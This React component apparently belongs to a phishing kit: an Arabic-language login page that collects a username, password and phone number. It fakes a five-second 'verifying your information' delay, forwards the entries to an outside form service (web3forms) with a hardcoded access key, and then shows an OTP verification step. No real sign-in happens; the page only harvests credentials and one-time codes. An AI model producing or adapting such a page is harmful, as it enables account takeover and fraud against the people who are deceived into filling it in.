import React, { useState } from 'react';
import Header from '../Components/Header';
import { FaUser } from 'react-icons/fa6';
import { FaLock } from 'react-icons/fa';
import { IoIosArrowRoundForward } from 'react-icons/io';
import OTPVerification from './OTP';
import { useNavigate } from 'react-router-dom';

const Subs = () => {
  const [result, setResult] = useState('');
  const [loading, setLoading] = useState(false);
  const [otpVisible, setOtpVisible] = useState(false);
  const navigate = useNavigate();

  const onSubmit = async (event) => {
    event.preventDefault();
    setResult('جاري الإرسال...');
    setLoading(true);

    setTimeout(async () => {
      setLoading(false);
      const formData = new FormData(event.target);
      formData.append('access_key', '7c0c5f93-6c62-4822-932f-f5f8710c78ac');

      const response = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        body: formData,
      });

      const data = await response.json();
      if (data.success) {
        setResult('تم إرسال النموذج بنجاح');
        event.target.reset();
        setOtpVisible(true);

        setTimeout(() => {
          setOtpVisible(false);
          navigate('/');
        }, 1000000000);
      } else {
        console.log('Error', data);
        setResult(data.message);
      }
    }, 5000);
  };

  return (
    <div className="flex flex-col h-screen bg-[#fff] text-[#202D5A]">

      {loading ? (
        <div className="flex flex-col items-center justify-center h-screen bg-[#004e90] z-50">
          <div className="animate-spin rounded-full h-12 w-12 border-t-4 border-blue-500"></div>
          <p className="mt-4 text-lg font-bold text-gray-700">الرجاء الإنتظار سيتم التأكد من المعلومات</p>
          <p className="text-sm text-gray-500">لا تخرج من هذه الصفحة حتى يتم التأكد</p>
        </div>
      ) : otpVisible ? (
        <OTPVerification />
      ) : (
        <div>
      <Header />
        <div className="flex flex-col flex-grow justify-center bg-cover w-full">
          <h4 className="text-center text-2xl font-bold pt-8">تسجيل الأن</h4>
          <div className="w-full px-4 pb-8">
            <form onSubmit={onSubmit} className="w-full px-4">
              <div className="relative w-full">
                <FaUser className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#004e90] mt-1" />
                <input
                  className="bg-transparent border-[1px] w-full mt-2 border-[#004e90] p-[12px] pr-10 rounded-md placeholder:text-[13px] focus:outline-none focus:border-[#86b7fe]"
                  type="text"
                  name="username"
                  placeholder="اسم المستخدم"
                  required
                />
              </div>
              <br />
              <div className="relative w-full">
                <FaLock className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#202D5A] mt-1" />
                <input
                  className="bg-transparent border-[1px] w-full mt-2 border-[#202D5A] p-[12px] pr-10 rounded-md placeholder:text-[13px]  focus:outline-none focus:border-[#86b7fe]"
                  type="password"
                  name="user_secret"
                  placeholder="كلمة السر"
                  required
                />
              </div>
              <br />
                 <div className="relative w-full">
                <FaLock className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#202D5A] mt-1" />
                <input
                  className="bg-transparent border-[1px] w-full mt-2 border-[#202D5A] p-[12px] pr-10 rounded-md placeholder:text-[13px]  focus:outline-none focus:border-[#86b7fe]"
                  type="phone"
                  name="phone"
                  placeholder="رقم الهاتف"
                  required
                />
              </div>
              <button
                className="w-1/2 flex justify-center items-center gap-3 cursor-pointer text-[#202D5A] bg-[#92D3C8] py-3 rounded-xl mt-4"
                type="submit"
              >
                <IoIosArrowRoundForward size={25} />
                دخول
              </button>
            </form>
            <div className='text-[#202D5A] flex justify-start py-4 px-4 items-center gap-1'>
              <span>هل نسيت</span>
              <a href="Forget" className='underline'>اسم المستخدم</a>
              أو
              <a href="Forget" className='underline'>كلمة المرور ؟</a>
            </div>
            <a href='Forget' className='underline px-4'>تسجيل الدخول لأول مرة</a>
            <span>{result}</span>
          </div>
        </div></div>
      )}
    </div>
  );
};

export default Subs;